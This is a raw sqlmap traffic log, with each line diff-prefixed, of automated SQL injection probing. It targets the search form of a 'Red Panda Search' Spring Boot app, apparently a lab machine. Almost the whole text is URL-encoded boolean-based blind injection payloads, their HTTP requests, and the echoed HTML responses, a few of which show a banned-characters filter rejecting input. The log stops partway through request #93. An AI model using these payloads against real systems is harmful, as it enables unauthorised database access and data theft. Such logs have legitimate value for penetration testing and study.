+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 165
+Connection: close
+
+name=woodenk%27%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20UPFT
+
+[12:50:42] [TRAFFIC IN] HTTP response [#77] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:41 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- UPFT</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:42] [PAYLOAD] woodenk')) AND 6230=(SELECT (CASE WHEN (6230=6882) THEN 6230 ELSE (SELECT 6882 UNION SELECT 1490) END))-- UOfz
+[12:50:42] [TRAFFIC OUT] HTTP request [#78]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 171
+Connection: close
+
+name=woodenk%27%29%29%20AND%206230%3D%28SELECT%20%28CASE%20WHEN%20%286230%3D6882%29%20THEN%206230%20ELSE%20%28SELECT%206882%20UNION%20SELECT%201490%29%20END%29%29--%20UOfz
+
+[12:50:42] [TRAFFIC IN] HTTP response [#78] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:41 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk')) AND 6230=(SELECT (CASE WHEN (6230=6882) THEN 6230 ELSE (SELECT 6882 UNION SELECT 1490) END))-- UOfz</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:42] [PAYLOAD] woodenk')) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- hniZ
+[12:50:42] [TRAFFIC OUT] HTTP request [#79]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 171
+Connection: close
+
+name=woodenk%27%29%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20hniZ
+
+[12:50:42] [TRAFFIC IN] HTTP response [#79] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:41 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk')) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- hniZ</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:42] [PAYLOAD] woodenk'))) AND 4555=(SELECT (CASE WHEN (4555=9627) THEN 4555 ELSE (SELECT 9627 UNION SELECT 4113) END))-- ufzy
+[12:50:42] [TRAFFIC OUT] HTTP request [#80]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 174
+Connection: close
+
+name=woodenk%27%29%29%29%20AND%204555%3D%28SELECT%20%28CASE%20WHEN%20%284555%3D9627%29%20THEN%204555%20ELSE%20%28SELECT%209627%20UNION%20SELECT%204113%29%20END%29%29--%20ufzy
+
+[12:50:42] [TRAFFIC IN] HTTP response [#80] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:42 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk'))) AND 4555=(SELECT (CASE WHEN (4555=9627) THEN 4555 ELSE (SELECT 9627 UNION SELECT 4113) END))-- ufzy</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:42] [PAYLOAD] woodenk'))) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- rHbe
+[12:50:42] [TRAFFIC OUT] HTTP request [#81]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 174
+Connection: close
+
+name=woodenk%27%29%29%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20rHbe
+
+[12:50:42] [TRAFFIC IN] HTTP response [#81] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:42 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk'))) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- rHbe</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:42] [PAYLOAD] woodenk%' AND 5993=(SELECT (CASE WHEN (5993=5711) THEN 5993 ELSE (SELECT 5711 UNION SELECT 7185) END))-- dhjh
+[12:50:42] [TRAFFIC OUT] HTTP request [#82]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 168
+Connection: close
+
+name=woodenk%25%27%20AND%205993%3D%28SELECT%20%28CASE%20WHEN%20%285993%3D5711%29%20THEN%205993%20ELSE%20%28SELECT%205711%20UNION%20SELECT%207185%29%20END%29%29--%20dhjh
+
+[12:50:43] [TRAFFIC IN] HTTP response [#82] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:42 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: Error occured: banned characters</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:43] [DEBUG] setting match ratio for current parameter to 0.980
+[12:50:43] [PAYLOAD] woodenk%' AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- dQNz
+[12:50:43] [TRAFFIC OUT] HTTP request [#83]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 168
+Connection: close
+
+name=woodenk%25%27%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20dQNz
+
+[12:50:43] [TRAFFIC IN] HTTP response [#83] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:42 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: Error occured: banned characters</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:43] [PAYLOAD] woodenk") AND 4804=(SELECT (CASE WHEN (4804=2337) THEN 4804 ELSE (SELECT 2337 UNION SELECT 6955) END))-- cuRh
+[12:50:43] [TRAFFIC OUT] HTTP request [#84]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 168
+Connection: close
+
+name=woodenk%22%29%20AND%204804%3D%28SELECT%20%28CASE%20WHEN%20%284804%3D2337%29%20THEN%204804%20ELSE%20%28SELECT%202337%20UNION%20SELECT%206955%29%20END%29%29--%20cuRh
+
+[12:50:43] [TRAFFIC IN] HTTP response [#84] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:42 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk") AND 4804=(SELECT (CASE WHEN (4804=2337) THEN 4804 ELSE (SELECT 2337 UNION SELECT 6955) END))-- cuRh</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:43] [PAYLOAD] woodenk") AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- qTZi
+[12:50:43] [TRAFFIC OUT] HTTP request [#85]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 168
+Connection: close
+
+name=woodenk%22%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20qTZi
+
+[12:50:43] [TRAFFIC IN] HTTP response [#85] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:42 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk") AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- qTZi</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:43] [PAYLOAD] woodenk")) AND 7182=(SELECT (CASE WHEN (7182=8457) THEN 7182 ELSE (SELECT 8457 UNION SELECT 5623) END))-- Psnh
+[12:50:43] [TRAFFIC OUT] HTTP request [#86]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 171
+Connection: close
+
+name=woodenk%22%29%29%20AND%207182%3D%28SELECT%20%28CASE%20WHEN%20%287182%3D8457%29%20THEN%207182%20ELSE%20%28SELECT%208457%20UNION%20SELECT%205623%29%20END%29%29--%20Psnh
+
+[12:50:43] [TRAFFIC IN] HTTP response [#86] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:43 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk")) AND 7182=(SELECT (CASE WHEN (7182=8457) THEN 7182 ELSE (SELECT 8457 UNION SELECT 5623) END))-- Psnh</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:43] [PAYLOAD] woodenk")) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- otQY
+[12:50:43] [TRAFFIC OUT] HTTP request [#87]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 171
+Connection: close
+
+name=woodenk%22%29%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20otQY
+
+[12:50:43] [TRAFFIC IN] HTTP response [#87] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:43 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk")) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- otQY</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:43] [PAYLOAD] woodenk"))) AND 6997=(SELECT (CASE WHEN (6997=5912) THEN 6997 ELSE (SELECT 5912 UNION SELECT 9591) END))-- UeAR
+[12:50:43] [TRAFFIC OUT] HTTP request [#88]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 174
+Connection: close
+
+name=woodenk%22%29%29%29%20AND%206997%3D%28SELECT%20%28CASE%20WHEN%20%286997%3D5912%29%20THEN%206997%20ELSE%20%28SELECT%205912%20UNION%20SELECT%209591%29%20END%29%29--%20UeAR
+
+[12:50:44] [TRAFFIC IN] HTTP response [#88] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:43 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk"))) AND 6997=(SELECT (CASE WHEN (6997=5912) THEN 6997 ELSE (SELECT 5912 UNION SELECT 9591) END))-- UeAR</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:44] [PAYLOAD] woodenk"))) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- tlTU
+[12:50:44] [TRAFFIC OUT] HTTP request [#89]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 174
+Connection: close
+
+name=woodenk%22%29%29%29%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20tlTU
+
+[12:50:44] [TRAFFIC IN] HTTP response [#89] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:43 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk"))) AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- tlTU</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:44] [PAYLOAD] woodenk" AND 4649=(SELECT (CASE WHEN (4649=8560) THEN 4649 ELSE (SELECT 8560 UNION SELECT 7002) END))-- BOfE
+[12:50:44] [TRAFFIC OUT] HTTP request [#90]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 165
+Connection: close
+
+name=woodenk%22%20AND%204649%3D%28SELECT%20%28CASE%20WHEN%20%284649%3D8560%29%20THEN%204649%20ELSE%20%28SELECT%208560%20UNION%20SELECT%207002%29%20END%29%29--%20BOfE
+
+[12:50:44] [TRAFFIC IN] HTTP response [#90] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:43 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk" AND 4649=(SELECT (CASE WHEN (4649=8560) THEN 4649 ELSE (SELECT 8560 UNION SELECT 7002) END))-- BOfE</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:44] [PAYLOAD] woodenk" AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- GLeU
+[12:50:44] [TRAFFIC OUT] HTTP request [#91]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 165
+Connection: close
+
+name=woodenk%22%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20GLeU
+
+[12:50:44] [TRAFFIC IN] HTTP response [#91] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:43 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk" AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- GLeU</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:44] [PAYLOAD] woodenk' WHERE 8912=8912 AND 5277=(SELECT (CASE WHEN (5277=1742) THEN 5277 ELSE (SELECT 1742 UNION SELECT 7598) END))-- BvAU
+[12:50:44] [TRAFFIC OUT] HTTP request [#92]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 187
+Connection: close
+
+name=woodenk%27%20WHERE%208912%3D8912%20AND%205277%3D%28SELECT%20%28CASE%20WHEN%20%285277%3D1742%29%20THEN%205277%20ELSE%20%28SELECT%201742%20UNION%20SELECT%207598%29%20END%29%29--%20BvAU
+
+[12:50:44] [TRAFFIC IN] HTTP response [#92] (200 None):
+Content-Type: text/html;charset=UTF-8
+Content-Language: en-US
+Transfer-Encoding: chunked
+Date: Sat, 16 Jul 2022 16:50:44 GMT
+Connection: close
+URI: http://10.10.11.170:8080/search
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Red Panda Search | Made with Spring Boot</title>
+    <link rel="stylesheet" href="css/search.css">
+  </head>
+  <body>
+    <form action="/search" method="POST">
+    <div class="wrap">
+      <div class="search">
+        <input type="text" name="name" placeholder="Search for a red panda">
+        <button type="submit" class="searchButton">
+          <i class="fa fa-search"></i>
+        </button>
+      </div>
+    </div>
+  </form>
+    <div class="wrapper">
+  <div class="results">
+    <h2 class="searched">You searched for: woodenk' WHERE 8912=8912 AND 5277=(SELECT (CASE WHEN (5277=1742) THEN 5277 ELSE (SELECT 1742 UNION SELECT 7598) END))-- BvAU</h2>
+      <h2>There are 0 results for your search</h2>
+       
+    </div>
+    </div>
+    
+  </body>
+</html>
+
+[12:50:44] [PAYLOAD] woodenk' WHERE 1334=1334 AND 5321=(SELECT (CASE WHEN (5321=5321) THEN 5321 ELSE (SELECT 1460 UNION SELECT 4876) END))-- ISIA
+[12:50:44] [TRAFFIC OUT] HTTP request [#93]:
+POST /search HTTP/1.1
+Cache-control: no-cache
+User-agent: sqlmap/1.6.4#stable (https://sqlmap.org)
+Referer: http://10.10.11.170:8080/search
+Host: 10.10.11.170:8080
+Accept: */*
+Accept-encoding: gzip,deflate
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 187
+Connection: close
+
+name=woodenk%27%20WHERE%201334%3D1334%20AND%205321%3D%28SELECT%20%28CASE%20WHEN%20%285321%3D5321%29%20THEN%205321%20ELSE%20%28SELECT%201460%20UNION%20SELECT%204876%29%20END%29%29--%20ISIA
+
